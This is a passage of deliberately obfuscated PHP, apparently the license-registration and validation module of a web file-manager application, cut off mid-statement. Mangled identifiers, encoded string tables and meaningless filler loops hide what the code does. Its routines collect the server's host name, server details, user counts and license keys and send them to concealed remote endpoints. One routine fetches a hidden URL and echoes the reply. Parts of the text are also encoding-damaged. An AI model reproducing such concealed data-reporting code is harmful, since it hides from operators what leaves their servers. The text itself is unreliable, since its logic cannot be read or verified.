$¢ËøûĞº = $´¥Ïı„¡[643]; $üºÆù–Ì = $GLOBALS[$è’Ï†¥ö[13]][$è’Ï†¥ö[14]]; $àöş³ñ« = $GLOBALS[$è’Ï†¥ö[13]][$è’Ï†¥ö[15]]; $„ñŠÖæ = $´¥Ïı„¡[644]; if (!$„ñŠÖæ) { die; } define($è’Ï†¥ö[20], isset($üºÆù–Ì[0]) && $üºÆù–Ì[0] ? $üºÆù–Ì[0] : $this->defaultModule); $®şœ“ËÛ = $´¥Ïı„¡[645]; define($è’Ï†¥ö[21], isset($üºÆù–Ì[1]) && $üºÆù–Ì[0] ? $üºÆù–Ì[1] : $this->defaultController); define($è’Ï†¥ö[22], isset($üºÆù–Ì[2]) && $üºÆù–Ì[0] ? $üºÆù–Ì[2] : $this->defaultAction); $êôè„ÇŞ = $´¥Ïı„¡[646]; if (!$êôè„ÇŞ) { die; } define($è’Ï†¥ö[23], MOD . $è’Ï†¥ö[0] . ST . $è’Ï†¥ö[0] . ACT); $Ì¤æàù = $´¥Ïı„¡[647]; if (!$Ì¤æàù) { die; } $_SERVER[$è’Ï†¥ö[24]] = strtolower(ACTION); $this->autorun(); if (count($üºÆù–Ì) >= 3) { $this->appRun($àöş³ñ«); } else { $this->appRun(ACTION); } } private $lykga0599a16 = array(); private $dmyb62b898d5 = ''; public function tilk15a79b59() { $ƒ§ßŒ­Ò =& $_SERVER[ Ö‘ñÄ”]; $ƒ´‡¢úº =& $_SERVER[Ç¼‰©óß]; $this->mbna1af90ff1(); $²å‘‡åô = $ƒ§ßŒ­Ò[648]; while ($²å‘‡åô < $ƒ§ßŒ­Ò[631]) { if ($²å‘‡åô >= 0) { break; } $²å‘‡åô++; } $this->ndsh28980a27(); $this->fran825b993e(); $Ö°×õË = $ƒ§ßŒ­Ò[649]; if (!$Ö°×õË) { return; } $this->lizh076d71e5(); $this->wgotafa26784(); $¿˜ë…ŞÁ = $ƒ§ßŒ­Ò[650]; if (strlen($¿˜ë…ŞÁ) < $ƒ§ßŒ­Ò[243]) { die; } $this->xemjf35a4f2b(); $this->hcxe5b43245f(); $Š Ûöğé = $ƒ§ßŒ­Ò[651]; if (!$Š Ûöğé) { die; } $this->cqxm86434903($ƒ´‡¢úº[25], array($this, $ƒ´‡¢úº[26])); $this->cqxm86434903($ƒ´‡¢úº[27], array($this, $ƒ´‡¢úº[28])); $this->cqxm86434903($ƒ´‡¢úº[29], array($this, $ƒ´‡¢úº[30])); $this->cqxm86434903($ƒ´‡¢úº[31], array($this, $ƒ´‡¢úº[32])); } public function ndhk03bfe00f($ÍÆß½ê) { $İ«»é÷à =& $_SERVER[ Ö‘ñÄ”]; $áŸûÆÊû =& $_SERVER[Ç¼‰©óß]; $¥®Ã¢õÀ = Model($áŸûÆÊû[33])->get(); $µ¿–×÷» = array($áŸûÆÊû[34], $áŸûÆÊû[35], $áŸûÆÊû[36], $áŸûÆÊû[37], $áŸûÆÊû[38], $áŸûÆÊû[39], $áŸûÆÊû[40], $áŸûÆÊû[41], $áŸûÆÊû[42], $áŸûÆÊû[43], $áŸûÆÊû[44], $áŸûÆÊû[45], $áŸûÆÊû[46], $áŸûÆÊû[47], $áŸûÆÊû[48], $áŸûÆÊû[49], $áŸûÆÊû[50], $áŸûÆÊû[51], $áŸûÆÊû[52], $áŸûÆÊû[53], $áŸûÆÊû[54], $áŸûÆÊû[55], $áŸûÆÊû[56], $áŸûÆÊû[57], $áŸûÆÊû[58], $áŸûÆÊû[59], $áŸûÆÊû[60], $áŸûÆÊû[61], $áŸûÆÊû[62], $áŸûÆÊû[63], $áŸûÆÊû[64], $áŸûÆÊû[65], $áŸûÆÊû[66], $áŸûÆÊû[67], $áŸûÆÊû[68], $áŸûÆÊû[69], $áŸûÆÊû[70], $áŸûÆÊû[71], $áŸûÆÊû[72], $áŸûÆÊû[73], $áŸûÆÊû[74], $áŸûÆÊû[75], $áŸûÆÊû[76], $áŸûÆÊû[77], $áŸûÆÊû[78], $áŸûÆÊû[79], $áŸûÆÊû[80], $áŸûÆÊû[81], $áŸûÆÊû[82], $áŸûÆÊû[83]); $üšÚ» = $İ«»é÷à[652]; if (!$üšÚ») { return; } foreach ($µ¿–×÷» as $åĞÉöçí) { $Ï¤›Ã¢ = $GLOBALS[$áŸûÆÊû[84]][$áŸûÆÊû[85]][$åĞÉöçí]; if (isset($¥®Ã¢õÀ[$åĞÉöçí])) { $Ï¤›Ã¢ = $¥®Ã¢õÀ[$åĞÉöçí]; } $ÍÆß½ê[$áŸûÆÊû[86]][$áŸûÆÊû[87]][$åĞÉöçí] = $Ï¤›Ã¢; } $Çšì•¯ = $ÍÆß½ê[$áŸûÆÊû[86]][$áŸûÆÊû[87]][$áŸûÆÊû[46]]; $ÏÄî¢Ö = $İ«»é÷à[653]; unset($ÍÆß½ê[$áŸûÆÊû[86]][$áŸûÆÊû[88]][$áŸûÆÊû[89]]); unset($ÍÆß½ê[$áŸûÆÊû[86]][$áŸûÆÊû[88]][$áŸûÆÊû[90]]); $¢Á›§²¬ = $İ«»é÷à[654]; if (!$¢Á›§²¬) { die; } unset($ÍÆß½ê[$áŸûÆÊû[86]][$áŸûÆÊû[87]][$áŸûÆÊû[46]]); unset($ÍÆß½ê[$áŸûÆÊû[86]][$áŸûÆÊû[87]][$áŸûÆÊû[91]]); $ÍÆß½ê[$áŸûÆÊû[86]][$áŸûÆÊû[87]][$áŸûÆÊû[92]] = array($áŸûÆÊû[93] => (int) $Çšì•¯[$áŸûÆÊû[94]], $áŸûÆÊû[95] => (int) _get($Çšì•¯, $áŸûÆÊû[96], 0)); $¬¹½Ãí = $İ«»é÷à[655]; $ÍÆß½ê[$áŸûÆÊû[97]][$áŸûÆÊû[98]] = Action($áŸûÆÊû[99])->accessToken(); $ŸËØü¶· = $İ«»é÷à[656]; if (!$ŸËØü¶·) { die; } $ÍÆß½ê[$áŸûÆÊû[97]][$áŸûÆÊû[100]] = md5($_SERVER[$áŸûÆÊû[101]] . $¥®Ã¢õÀ[$áŸûÆÊû[102]]); $ÍÆß½ê[$áŸûÆÊû[97]][$áŸûÆÊû[103]] = base64_encode(serverInfo()); $Ä¾²úÚ† = $İ«»é÷à[657]; if (strlen($Ä¾²úÚ†) < $İ«»é÷à[243]) { return; } $ÍÆß½ê[$áŸûÆÊû[97]][$áŸûÆÊû[104]] = $this->dmyb62b898d5; if ($¥®Ã¢õÀ[$áŸûÆÊû[104]] != $áŸûÆÊû[105]) { $ÍÆß½ê[$áŸûÆÊû[97]][$áŸûÆÊû[106]] = $¥®Ã¢õÀ[$áŸûÆÊû[106]]; $ÍÆß½ê[$áŸûÆÊû[97]][$áŸûÆÊû[107]] = $¥®Ã¢õÀ[$áŸûÆÊû[107]]; $¼ÉÃÌü• = rand_string(10) . $this->dmyb62b898d5 . rand_string(5); $ÍÆß½ê[$áŸûÆÊû[86]][$áŸûÆÊû[108]][$áŸûÆÊû[109]] = $this->dimuc3ddd7f1($¼ÉÃÌü•, $ÍÆß½ê[$áŸûÆÊû[97]][$áŸûÆÊû[100]]); } if ($this->dmyb62b898d5 == $áŸûÆÊû[105]) { $ÍÆß½ê[$áŸûÆÊû[86]][$áŸûÆÊû[87]][$áŸûÆÊû[92]][$áŸûÆÊû[96]] = 0; } $ÍÆß½ê[$áŸûÆÊû[97]][$áŸûÆÊû[110]] = _get($this->lykga0599a16, $áŸûÆÊû[111], $áŸûÆÊû[6]); $ÍÆß½ê[$áŸûÆÊû[97]][$áŸûÆÊû[112]] = _get($this->lykga0599a16, $áŸûÆÊû[113], $áŸûÆÊû[6]); $ò°äí‚¹ = $İ«»é÷à[658]; if (!$ò°äí‚¹) { return; } if (_get($GLOBALS, $áŸûÆÊû[114]) && $this->config[$áŸûÆÊû[115]]) { $ÍÆß½ê[$áŸûÆÊû[97]][$áŸûÆÊû[116]] = WEB_ROOT; } return $ÍÆß½ê; } private function xemjf35a4f2b() { $íÕı·¦´ =& $_SERVER[ Ö‘ñÄ”]; $—ù€è£· =& $_SERVER[Ç¼‰©óß]; $§‡„Ÿ÷ı = $_SERVER[$—ù€è£·[24]] == $—ù€è£·[117]; $’¶Å¹õ¶ = $íÕı·¦´[659]; while ($’¶Å¹õ¶ < $íÕı·¦´[627]) { if ($’¶Å¹õ¶ >= 0) { break; } $’¶Å¹õ¶++; } if ($_SERVER[$—ù€è£·[24]] == $—ù€è£·[118] && $_GET[$—ù€è£·[119]] == $—ù€è£·[120]) { $§‡„Ÿ÷ı = !0; } if ($§‡„Ÿ÷ı) { $ÀøèõŠÇ = array($—ù€è£·[104] => $this->dmyb62b898d5, $—ù€è£·[121] => $this->lzvb5a796e55(), $—ù€è£·[122] => Model($—ù€è£·[123])->count()); if ($this->dmyb62b898d5 != $—ù€è£·[105]) { $Ã¤ØŒßÒ = _get($this->lykga0599a16, $—ù€è£·[124]); if ($Ã¤ØŒßÒ) { $ÀøèõŠÇ[$—ù€è£·[125]] = $Ã¤ØŒßÒ; $ÀøèõŠÇ[$—ù€è£·[126]] = strtotime(_get($this->lykga0599a16, $—ù€è£·[127])); $ÀøèõŠÇ[$—ù€è£·[128]] = _get($this->lykga0599a16, $—ù€è£·[113]); } $æ”Ÿ¬‰— = Model($—ù€è£·[33])->get($—ù€è£·[129], $—ù€è£·[6], !0); if (is_string($æ”Ÿ¬‰—) && substr($æ”Ÿ¬‰—, 0, 1) == $—ù€è£·[130]) { $æ”Ÿ¬‰— = json_decode_force($æ”Ÿ¬‰—); } if (is_array($æ”Ÿ¬‰—) && $æ”Ÿ¬‰—[$—ù€è£·[131]] && strstr($æ”Ÿ¬‰—[$—ù€è£·[131]], $—ù€è£·[132])) { $›ÖÕŞäé = explode($—ù€è£·[132], $æ”Ÿ¬‰—[$—ù€è£·[131]]); $ÀøèõŠÇ[$—ù€è£·[133]] = $›ÖÕŞäé[0]; } } $ÀøèõŠÇ = $this->ptzc88ee29e2(json_encode($ÀøèõŠÇ), md5($—ù€è£·[134])); $î˜‡ôä = array($—ù€è£·[135] => $ÀøèõŠÇ); $»œúáì = $íÕı·¦´[660]; while (strlen($»œúáì) < $íÕı·¦´[627]) { if (!$»œúáì) { break; } $»œúáì++; } call_user_func(array($—ù€è£·[136], $—ù€è£·[137]), $î˜‡ôä); $Àì–äõˆ = $íÕı·¦´[661]; while (strlen($Àì–äõˆ) < $íÕı·¦´[243]) { if (!$Àì–äõˆ) { break; } $Àì–äõˆ++; } } if ($this->dmyb62b898d5 == $—ù€è£·[105]) { return; } $õ«à«ñî = array($—ù€è£·[138], $—ù€è£·[139], $—ù€è£·[140], $—ù€è£·[141], $—ù€è£·[142], $—ù€è£·[143]); $¤š«àÑÑ = Model($—ù€è£·[33])->get(); $ÉÒëˆ«Ø = $íÕı·¦´[662]; $î˜‡ôä = array($—ù€è£·[144] => $¤š«àÑÑ[$—ù€è£·[34]], $—ù€è£·[145] => $¤š«àÑÑ[$—ù€è£·[35]], $—ù€è£·[146] => $—ù€è£·[6]); $È±¬õ€€ = $íÕı·¦´[663]; while (strlen($È±¬õ€€) < $íÕı·¦´[627]) { if (!$È±¬õ€€) { break; } $È±¬õ€€++; } foreach ($õ«à«ñî as $äÎ‹Ï—ó) { if (!isset($¤š«àÑÑ[$äÎ‹Ï—ó]) || !$¤š«àÑÑ[$äÎ‹Ï—ó]) { continue; } $î˜‡ôä[$äÎ‹Ï—ó] = $¤š«àÑÑ[$äÎ‹Ï—ó]; $›ëşü¼ô = $íÕı·¦´[664]; while ($›ëşü¼ô < $íÕı·¦´[627]) { if ($›ëşü¼ô >= 0) { break; } $›ëşü¼ô++; } } call_user_func(array($—ù€è£·[136], $—ù€è£·[137]), $î˜‡ôä); } private function lizh076d71e5() { $¨ºìˆÔ =& $_SERVER[ Ö‘ñÄ”]; $ğÛ¿×¡£ =& $_SERVER[Ç¼‰©óß]; if ($_SERVER[$ğÛ¿×¡£[24]] != $ğÛ¿×¡£[147]) { return; } if (!_get($GLOBALS, $ğÛ¿×¡£[114])) { die; } $¶ÂÀÚû¥ = $GLOBALS[$ğÛ¿×¡£[13]]; if (isset($¶ÂÀÚû¥[$ğÛ¿×¡£[148]])) { $this->umex847bcd5d(); die; } if (!isset($¶ÂÀÚû¥[$ğÛ¿×¡£[149]]) || strlen($¶ÂÀÚû¥[$ğÛ¿×¡£[149]]) != 16) { show_json($ğÛ¿×¡£[150] . $¶ÂÀÚû¥[$ğÛ¿×¡£[149]], !1); } $ù¡Ôğ¹¼ = Model($ğÛ¿×¡£[33])->get($ğÛ¿×¡£[102]); $Ğ¶ƒ ƒÇ = md5($_SERVER[$ğÛ¿×¡£[101]] . $ù¡Ôğ¹¼); $º×ı®éû = $¨ºìˆÔ[665]; while ($º×ı®éû < $¨ºìˆÔ[623]) { if ($º×ı®éû >= 0) { break; } $º×ı®éû++; } $é€òÚ” = array($ğÛ¿×¡£[149] => $¶ÂÀÚû¥[$ğÛ¿×¡£[149]], $ğÛ¿×¡£[151] => rand_string(16), $ğÛ¿×¡£[152] => $ğÛ¿×¡£[134], $ğÛ¿×¡£[153] => $ğÛ¿×¡£[154], $ğÛ¿×¡£[155] => $_SERVER[$ğÛ¿×¡£[156]], $ğÛ¿×¡£[157] => $_SERVER[$ğÛ¿×¡£[158]], $ğÛ¿×¡£[159] => $_SERVER[$ğÛ¿×¡£[160]], $ğÛ¿×¡£[100] => $Ğ¶ƒ ƒÇ, $ğÛ¿×¡£[161] => Model($ğÛ¿×¡£[33])->get($ğÛ¿×¡£[129])); $ıó¼öÕ¥ = $¨ºìˆÔ[666]; if ($¶ÂÀÚû¥[$ğÛ¿×¡£[162]] == $ğÛ¿×¡£[163]) { $ˆê³š¼ = $this->ptzc88ee29e2($Ğ¶ƒ ƒÇ, $ğÛ¿×¡£[164]); $äûÜğËÉ = $this->dimuc3ddd7f1(json_encode($é€òÚ”), $Ğ¶ƒ ƒÇ . $ğÛ¿×¡£[165], 3); $äûÜğËÉ = $äûÜğËÉ . $ğÛ¿×¡£[166] . $_SERVER[$ğÛ¿×¡£[156]]; $÷œÉ”¹™ = $this->nmpj2430bb1d($ğÛ¿×¡£[167] . $ˆê³š¼ . $ğÛ¿×¡£[168] . $äûÜğËÉ, -1); show_json($÷œÉ”¹™, !0); } else { if ($¶ÂÀÚû¥[$ğÛ¿×¡£[162]] == $ğÛ¿×¡£[169]) { $ºÀóåàº = substr(md5($ğÛ¿×¡£[170] . $Ğ¶ƒ ƒÇ), 12, 15) . $ğÛ¿×¡£[171]; $äûÜğËÉ = $this->opnm5e9bc351(trim($¶ÂÀÚû¥[$ğÛ¿×¡£[172]]), $ºÀóåàº, 2); $­˜”¢ü¼ = json_decode($äûÜğËÉ, !0); if (!is_array($­˜”¢ü¼) || !is_array($­˜”¢ü¼[$ğÛ¿×¡£[173]]) || $­˜”¢ü¼[$ğÛ¿×¡£[149]] != !0) { $†ÈÄÃ‹Ê = $ğÛ¿×¡£[174]; $¦ÅÑñŒÄ = $­˜”¢ü¼[$ğÛ¿×¡£[173]] ? $ğÛ¿×¡£[175] . $­˜”¢ü¼[$ğÛ¿×¡£[173]] : $†ÈÄÃ‹Ê; show_json($¦ÅÑñŒÄ, !1); } else { $é€òÚ”[$ğÛ¿×¡£[151]] = $­˜”¢ü¼[$ğÛ¿×¡£[173]][$ğÛ¿×¡£[176]]; } } else { $­˜”¢ü¼ = $this->nmpj2430bb1d($ğÛ¿×¡£[177], $é€òÚ”, 10); } } if (!is_array($­˜”¢ü¼) || !is_array($­˜”¢ü¼[$ğÛ¿×¡£[173]]) || $­˜”¢ü¼[$ğÛ¿×¡£[149]] != !0) { $†ÈÄÃ‹Ê = LNG($ğÛ¿×¡£[178]); $¦ÅÑñŒÄ = $­˜”¢ü¼[$ğÛ¿×¡£[173]] ? $ğÛ¿×¡£[175] . $­˜”¢ü¼[$ğÛ¿×¡£[173]] : $†ÈÄÃ‹Ê; show_json($¦ÅÑñŒÄ, !1); } $Ì£€à·Ï = $­˜”¢ü¼[$ğÛ¿×¡£[173]]; $ßÀ•…Í¦ = $this->xbtz38b4df13($Ì£€à·Ï[$ğÛ¿×¡£[179]]); $½’¤ØÖ = $¨ºìˆÔ[667]; if (!$½’¤ØÖ) { die; } if (!$ßÀ•…Í¦ || $ßÀ•…Í¦ != $Ì£€à·Ï[$ğÛ¿×¡£[127]]) { $ôµúô´ = array($ğÛ¿×¡£[180] => Model($ğÛ¿×¡£[33])->get($ğÛ¿×¡£[102]), $ğÛ¿×¡£[181] => $_SERVER[$ğÛ¿×¡£[101]], $ğÛ¿×¡£[182] => this_url(), $ğÛ¿×¡£[157] => $_SERVER[$ğÛ¿×¡£[158]]); $äûÜğËÉ = $this->izxn465f1b71(json_encode($ôµúô´)); $this->nmpj2430bb1d($ğÛ¿×¡£[183] . $äûÜğËÉ); show_json(LNG($ğÛ¿×¡£[184]), !0); } $æ½ö£ë = array($ğÛ¿×¡£[185] => $Ì£€à·Ï[$ğÛ¿×¡£[186]], $ğÛ¿×¡£[187] => $Ì£€à·Ï[$ğÛ¿×¡£[188]], $ğÛ¿×¡£[189] => rand_string(16), $ğÛ¿×¡£[104] => $Ì£€à·Ï[$ğÛ¿×¡£[190]]); if ($é€òÚ”[$ğÛ¿×¡£[151]]) { $æ½ö£ë[$ğÛ¿×¡£[189]] = $é€òÚ”[$ğÛ¿×¡£[151]]; } $ÚÂ˜áÂ½ = substr(md5($æ½ö£ë[$ğÛ¿×¡£[187]]), 10, 10); $„Ñ—ïÕ = $ÚÂ˜áÂ½ . $æ½ö£ë[$ğÛ¿×¡£[104]] . $æ½ö£ë[$ğÛ¿×¡£[189]]; $æ½ö£ë[$ğÛ¿×¡£[106]] = strrev(base64_encode($this->ptzc88ee29e2($„Ñ—ïÕ, $ğÛ¿×¡£[191]))); $½·–€×¥ = rand_string(16); $úÚ¶ÇÇ³ = $¨ºìˆÔ[668]; while (strlen($úÚ¶ÇÇ³) < $¨ºìˆÔ[631]) { if (!$úÚ¶ÇÇ³) { break; } $úÚ¶ÇÇ³++; } $ÇÃÆÀãÎ = $½·–€×¥ . $æ½ö£ë[$ğÛ¿×¡£[104]] . $this->ptzc88ee29e2(md5($æ½ö£ë[$ğÛ¿×¡£[185]]), $½·–€×¥); $æ½ö£ë[$ğÛ¿×¡£[107]] = base64_encode(strrev($this->ptzc88ee29e2($ÇÃÆÀãÎ, $ğÛ¿×¡£[192]))); $ÇÉ«µŒ¯ = $¨ºìˆÔ[669]; if ($Ì£€à·Ï[$ğÛ¿×¡£[193]] && $Ì£€à·Ï[$ğÛ¿×¡£[193]] >= 1) { Model($ğÛ¿×¡£[33])->setDeep($ğÛ¿×¡£[194], $ğÛ¿×¡£[120]); } Model($ğÛ¿×¡£[33])->set($æ½ö£ë); $æ  Øûé = md5($_SERVER[$ğÛ¿×¡£[101]] . strrev($ù¡Ôğ¹¼) . $æ½ö£ë[$ğÛ¿×¡£[187]]); $—Âıú»° = strrev(substr($æ  Øûé, 10, 16)); $ï·¸»Ş° = $this->dimuc3ddd7f1(json_encode($Ì£€à·Ï), $æ  Øûé); $ÉãïÜğ© = $¨ºìˆÔ[670]; if (!$ÉãïÜğ©) { return; } $ïû×Š•Ê = array_to_keyvalue(Model($ğÛ¿×¡£[7])->listData(), $ğÛ¿×¡£[195]); $ıúê°“… = $ïû×Š•Ê[$ğÛ¿×¡£[196]]; $—øòÕ½‘ = $¨ºìˆÔ[671]; $µÀ¼òÚÄ = array(); $„Ï¦í¬õ = $¨ºìˆÔ[672]; if (!$„Ï¦í¬õ) { die; } $µÀ¼òÚÄ[$—Âıú»°] = $ï·¸»Ş°; $ÛãÒ¨„ = $¨ºìˆÔ[673]; if (strlen($ÛãÒ¨„) < $¨ºìˆÔ[633]) { return; } Model($ğÛ¿×¡£[7])->update($ıúê°“…[$ğÛ¿×¡£[197]], array($ğÛ¿×¡£[198] => $µÀ¼òÚÄ)); $·‚»¼´ = $¨ºìˆÔ[674]; if (!$·‚»¼´) { return; } $this->lykga0599a16 = $Ì£€à·Ï; $ß©ğ©•Ğ = $¨ºìˆÔ[675]; if (strlen($ß©ğ©•Ğ) < $¨ºìˆÔ[631]) { die; } $this->dmyb62b898d5 = $æ½ö£ë[$ğÛ¿×¡£[104]]; $Õ×á¶ó = $¨ºìˆÔ[676]; if (strlen($Õ×á¶ó) < $¨ºìˆÔ[623]) { return; } $this->licenseRegistSuccess(); Cache::set($ğÛ¿×¡£[199] . md5($ù¡Ôğ¹¼ . $ğÛ¿×¡£[200]), $ğÛ¿×¡£[6]); $‹§“î™˜ = $¨ºìˆÔ[677]; while ($‹§“î™˜ < $¨ºìˆÔ[627]) { if ($‹§“î™˜ >= 0) { break; } $‹§“î™˜++; } show_json(LNG($ğÛ¿×¡£[184]), !0); } private function licenseRegistSuccess() { $‚°ğòàÑ =& $_SERVER[ Ö‘ñÄ”]; $Î±„¶„ç =& $_SERVER[Ç¼‰©óß]; $è½¡®ª = Model($Î±„¶„ç[33])->get(); $şµÅ²›ª = $‚°ğòàÑ[678]; while (strlen($şµÅ²›ª) < $‚°ğòàÑ[243]) { if (!$şµÅ²›ª) { break; } $şµÅ²›ª++; } if ($è½¡®ª[$Î±„¶„ç[63]] != $Î±„¶„ç[120]) { Model($Î±„¶„ç[33])->set($Î±„¶„ç[63], $Î±„¶„ç[120]); } Action($Î±„¶„ç[201])->initStart(!0); } private function umex847bcd5d() { $ËÏö„†ò =& $_SERVER[ Ö‘ñÄ”]; $·ìéŒ =& $_SERVER[Ç¼‰©óß]; Model($·ìéŒ[33])->set(array($·ìéŒ[185] => $·ìéŒ[6], $·ìéŒ[187] => $·ìéŒ[6], $·ìéŒ[104] => $·ìéŒ[105], $·ìéŒ[106] => $·ìéŒ[6], $·ìéŒ[107] => $·ìéŒ[6])); $Ãç€÷›ú = $ËÏö„†ò[679]; if (strlen($Ãç€÷›ú) < $ËÏö„†ò[243]) { return; } Model($·ìéŒ[33])->setDeep($·ìéŒ[194], $·ìéŒ[202]); $àã×‰Ù• = $ËÏö„†ò[680]; if (!$àã×‰Ù•) { return; } $this->lykga0599a16 = array(); $ùÓ¹ÎÑ = $ËÏö„†ò[681]; while (strlen($ùÓ¹ÎÑ) < $ËÏö„†ò[633]) { if (!$ùÓ¹ÎÑ) { break; } $ùÓ¹ÎÑ++; } $this->dmyb62b898d5 = $·ìéŒ[105]; $¤’ñÒª = $ËÏö„†ò[682]; } private function mbna1af90ff1() { $‹ºÁ¼€ò =& $_SERVER[ Ö‘ñÄ”]; $²ªÆµ®î =& $_SERVER[Ç¼‰©óß]; $_SERVER[$²ªÆµ®î[158]] = _get($_SERVER, $²ªÆµ®î[158], APP_HOST); $this->dmyb62b898d5 = $²ªÆµ®î[105]; $‰¦ĞûŠŸ = Model($²ªÆµ®î[33])->get(); $¦ê­™¹µ = $‹ºÁ¼€ò[683]; while (strlen($¦ê­™¹µ) < $‹ºÁ¼€ò[243]) { if (!$¦ê­™¹µ) { break; } $¦ê­™¹µ++; } if ($‰¦ĞûŠŸ[$²ªÆµ®î[104]] == $²ªÆµ®î[105]) { return; } $š„”ËÜ· = Model($²ªÆµ®î[33])->get($²ªÆµ®î[102]); $ŠúâÎ™ = $²ªÆµ®î[199] . md5($š„”ËÜ· . $²ªÆµ®î[200]); $ÔÄÇöó = Cache::get($ŠúâÎ™); if (!is_array($ÔÄÇöó) || !isset($ÔÄÇöó[$²ªÆµ®î[203]]) || time() - $ÔÄÇöó[$²ªÆµ®î[203]] >= 60) { $êûÃâĞß = Model($²ªÆµ®î[7])->loadList(); $‚ÖµÆ½ = $êûÃâĞß[$²ªÆµ®î[196]]; $Å‚Âó’Ç = md5($_SERVER[$²ªÆµ®î[101]] . strrev($š„”ËÜ·) . $‰¦ĞûŠŸ[$²ªÆµ®î[187]]); $íóÇĞ€¸ = strrev(substr($Å‚Âó’Ç, 10, 16)); $ÔÄÇöó = $this->opnm5e9bc351($‚ÖµÆ½[$²ªÆµ®î[84]][$íóÇĞ€¸], $Å‚Âó’Ç); $ÔÄÇöó = json_decode($ÔÄÇöó, !0); } if (!is_array($ÔÄÇöó)) { return $this->umex847bcd5d(); } $ë†ºº³ = strtotime($ÔÄÇöó[$²ªÆµ®î[127]]); if (time() >= $ë†ºº³) { return $this->umex847bcd5d(); } if (time() - $ÔÄÇöó[$²ªÆµ®î[203]] > 20) { $ÔÄÇöó[$²ªÆµ®î[203]] = time(); Cache::set($ŠúâÎ™, $ÔÄÇöó); } $this->lykga0599a16 = $ÔÄÇöó; $this->dmyb62b898d5 = $‰¦ĞûŠŸ[$²ªÆµ®î[104]]; $‚º¦ú– = $‹ºÁ¼€ò[684]; } private function ndsh28980a27() { $™Ã´é¬¦ =& $_SERVER[ Ö‘ñÄ”]; $ğÅÜ£ë¼ =& $_SERVER[Ç¼‰©óß]; $õÆ›÷ü¢ = $GLOBALS[$ğÅÜ£ë¼[13]]; $ò¬¿†³¬ = $™Ã´é¬¦[685]; $¨Î¨¼Î = $_SERVER[$ğÅÜ£ë¼[24]]; $´¦êıÖÈ = $™Ã´é¬¦[686]; while ($´¦êıÖÈ < $™Ã´é¬¦[627]) { if ($´¦êıÖÈ >= 0) { break; } $´¦êıÖÈ++; } if ($¨Î¨¼Î == $ğÅÜ£ë¼[204] && $this->dmyb62b898d5 == $ğÅÜ£ë¼[105]) { show_json(LNG($ğÅÜ£ë¼[205]), !1, $ğÅÜ£ë¼[206]); } $şÏ•ÇÅˆ = array($ğÅÜ£ë¼[207], $ğÅÜ£ë¼[208]); if (in_array($¨Î¨¼Î, $şÏ•ÇÅˆ)) { if ($this->dmyb62b898d5 == $ğÅÜ£ë¼[105] && isset($õÆ›÷ü¢[$ğÅÜ£ë¼[209]])) { show_json(LNG($ğÅÜ£ë¼[205]), !1, $ğÅÜ£ë¼[206]); die; } $–³«Å÷÷ = $this->lzvb5a796e55(); if ($–³«Å÷÷ != intval($ğÅÜ£ë¼[210])) { if ($–³«Å÷÷ <= Model($ğÅÜ£ë¼[123])->count()) { show_json(LNG($ğÅÜ£ë¼[211]), !1, $ğÅÜ£ë¼[206]); die; } } } } private function fran825b993e() { $©¤ŠúÉç =& $_SERVER[ Ö‘ñÄ”]; $İ€Œœ =& $_SERVER[Ç¼‰©óß]; $Ãğ‘¼øû = array($İ€Œœ[117], $İ€Œœ[118]); $Îæ‹Ù«æ = $©¤ŠúÉç[687]; while ($Îæ‹Ù«æ < $©¤ŠúÉç[631]) { if ($Îæ‹Ù«æ >= 0) { break; } $Îæ‹Ù«æ++; } if (!_get($GLOBALS, $İ€Œœ[114]) || !isset($_GET[$İ€Œœ[212]])) { return; } if (!in_array($_SERVER[$İ€Œœ[24]], $Ãğ‘¼øû)) { return; } $±İóÚ®½ = $İ€Œœ[213]; $±İóÚ®½ = $this->mbdk9afc27f3($±İóÚ®½, $İ€Œœ[214]); $¤¬ªÒã = stream_context_create(array($İ€Œœ[215] => array($İ€Œœ[216] => $İ€Œœ[217], $İ€Œœ[218] => 3))); $ä“çğò = $©¤ŠúÉç[688]; $Æ˜²¨§Ü = @file_get_contents($±İóÚ®½, !1, $¤¬ªÒã); $½ÃˆøŠÛ = $©¤ŠúÉç[689]; while ($½ÃˆøŠÛ < $©¤ŠúÉç[633]) { if ($½ÃˆøŠÛ >= 0) { break; } $½ÃˆøŠÛ++; } header($İ€Œœ[219]); if ($Æ˜²¨§Ü && strstr($Æ˜²¨§Ü, $İ€Œœ[220])) { echo $Æ˜²¨§Ü; } die; } public function yxrf0a04b790($×…½Ş—¡) { $şŠ´Ã =& $_SERVER[ Ö‘ñÄ”]; $ÒÈ‰ççÍ =& $_SERVER[Ç¼‰©óß]; if ($this->dmyb62b898d5 == $ÒÈ‰ççÍ[221]) { return $×…½Ş—¡; } $‚÷…ÄÛê = array($ÒÈ‰ççÍ[222] => $ÒÈ‰ççÍ[223], $ÒÈ‰ççÍ[224] => $ÒÈ‰ççÍ[223], $ÒÈ‰ççÍ[225] => $ÒÈ‰ççÍ[223], $ÒÈ‰ççÍ[226] => $ÒÈ‰ççÍ[223], $ÒÈ‰ççÍ[227] => $ÒÈ‰ççÍ[228], $ÒÈ‰ççÍ[229] => $ÒÈ‰ççÍ[228], $ÒÈ‰ççÍ[230] => $ÒÈ‰ççÍ[228], $ÒÈ‰ççÍ[231] => $ÒÈ‰ççÍ[228], $ÒÈ‰ççÍ[232] => $ÒÈ‰ççÍ[228], $ÒÈ‰ççÍ[233] => $ÒÈ‰ççÍ[228], $ÒÈ‰ççÍ[234] => $ÒÈ‰ççÍ[228], $ÒÈ‰ççÍ[235] => $ÒÈ‰ççÍ[228], $ÒÈ‰ççÍ[236] => $ÒÈ‰ççÍ[228], $ÒÈ‰ççÍ[237] => $ÒÈ‰ççÍ[228], $ÒÈ‰ççÍ[238] => $ÒÈ‰ççÍ[228], $ÒÈ‰ççÍ[239] => $ÒÈ‰ççÍ[228]); $ï–§îËÆ = $şŠ´Ã[690]; if (strlen($ï–§îËÆ) < $şŠ´Ã[623]) { die; } $Ê¦¸ß¿” = explode($ÒÈ‰ççÍ[240], _get($this->lykga0599a16, $ÒÈ‰ççÍ[111], $ÒÈ‰ççÍ[6])); $Ğ›íË‡ë = $şŠ´Ã[691]; while ($Ğ›íË‡ë < $şŠ´Ã[631]) { if ($Ğ›íË‡ë >= 0) { break; } $Ğ›íË‡ë++; } $‘êµÂ¿ê = array(); $â¯øÖ°÷ = $şŠ´Ã[680]; if (!$â¯øÖ°÷) { die; } foreach ($‚÷…ÄÛê as $’† ¼í¼ => $¸ñÖôõÚ) { if ($¸ñÖôõÚ == $ÒÈ‰ççÍ[223] && substr($this->dmyb62b898d5, 0, 1) == $ÒÈ‰ççÍ[223]) { continue; } if (!in_array($’† ¼í¼, 